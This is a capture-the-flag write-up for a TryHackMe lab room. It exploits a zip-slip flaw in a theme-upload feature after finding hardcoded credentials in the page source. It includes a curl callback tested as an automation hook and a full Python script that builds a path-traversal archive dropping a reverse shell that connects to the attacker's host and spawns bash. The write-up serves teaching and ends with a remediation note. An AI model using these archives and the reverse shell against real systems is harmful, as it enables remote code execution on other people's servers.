# The Hollow Shell

> **TryHackMe Room:** [The Hollow Shell](https://tryhackme.com/room/hh-thehollowshell-ddb582ac)

This write-up covers how I approached the room, step by step. Flags and specific key and password values are not included.

## Initial Access & Getting the Flag

The `nmap` scan showed two open ports: `22` and `5000`. This explained why the site was inaccessible when I tried to reach it right after the machine booted up.

The web page presented a login form. This time I skipped basic SQL injection attempts and went straight to the page source, where I found hardcoded credentials inside a comment block (`/* --- */`).

After logging in, the dashboard displayed the following:

```text
Bring a shell ashore

Found something on the beach? Upload it as a shell (a .zip souvenir pack) to set the ambiance on the in-room tablets. Each shell must contain a shell.json manifest listing its assets (images, stylesheets).
```

Below this was a `browse` button to select a zip file and an upload button labeled "HOLD IT TO THE ROOM'S EAR." The page also described the accepted file types:

```text
A shell may include optional automation hooks — the theme worker applies these for you shortly after the shell comes ashore, so you don't have to touch each tablet by hand. Allowed asset types: png jpg gif svg css json.
```

The first zip file I uploaded contained this manifest:

```json
{
    "name": "callback-test",
    "assets": []
}
```

I then tried these, in order:

```json
{
    "name": "callback-test",
    "assets": [],
    "hooks": ["id", "whoami"]
}
```

```json
{
    "name": "callback-test",
    "assets": [],
    "hooks": [
        "curl http://<MY_IP>:<PORT>/"
    ]
}
```

Next, I tested whether the site was vulnerable to zip slip, a known class of vulnerability with several public references online. I used the following Python script to build a test archive and confirm it:

```py
import json
import zipfile

manifest = {
    "name": "zipslip-proof",
    "assets": []
}

with zipfile.ZipFile("zipslip-proof.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr(
        "../../static/zipslip-proof.css",
        "ZIP_SLIP_CONFIRMED\n"
    )

print("Created zipslip-proof.zip")
```

The archive contains a normal `shell.json` entry alongside a second entry named `../../static/zipslip-proof.css`. If the site were not vulnerable, the file would be extracted with that literal name intact. Since it was vulnerable, the path traversal took effect, and I was able to navigate to the resulting directory and confirm the file landed there.

With this confirmed, I built a reverse shell using the same technique:

```py
import json
import zipfile

LHOST = <MY-IP>
LPORT = <PORT>

manifest = {
    "name": "shoreline-update",
    "assets": []
}

callback = f'''
import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(({LHOST!r}, {LPORT}))

for descriptor in (0, 1, 2):
    os.dup2(sock.fileno(), descriptor)

pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as archive:
    archive.writestr("shell.json", json.dumps(manifest))
    archive.writestr("../../hooks/callback.py", callback)

print("Created reverse-shell.zip")
```

With a listener open on the same port in another terminal, uploading this archive gave me a shell shortly after. I navigated to the home directory and read the flag. Unlike other rooms, no privilege escalation to root was required here.

## Conclusion

The core of this room was a zip-slip vulnerability hidden behind an otherwise ordinary file upload feature. The upload form itself looked reasonably well designed, restricting file types and expecting a specific manifest structure, but none of that mattered once the archive extraction logic failed to validate the paths inside the zip file. It is a good reminder that input validation at the upload stage does not protect against vulnerabilities in how the uploaded content is later processed. A real-world fix would involve sanitizing or rejecting any archive entry whose path resolves outside the intended extraction directory, rather than trusting the paths stored inside the zip file itself.
